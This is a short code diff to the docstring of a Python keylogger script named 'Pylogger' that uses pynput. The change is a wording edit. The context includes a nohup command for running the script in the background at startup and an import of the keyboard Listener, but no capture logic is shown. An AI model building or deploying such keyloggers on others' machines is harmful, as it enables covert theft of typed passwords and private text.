@@ -1,13 +1,12 @@
 """
     Pylogger
-    A simple keylogger script made using pynput package.
+    A simple keylogger script made using pynput package in python.
 
     To run this script at the system startup (Linux) automatically, open your terminal and type the following
     command:
         nohup python path/to/your/script.pyw &
 
 """
-
 
 from pynput.keyboard import Listener
 
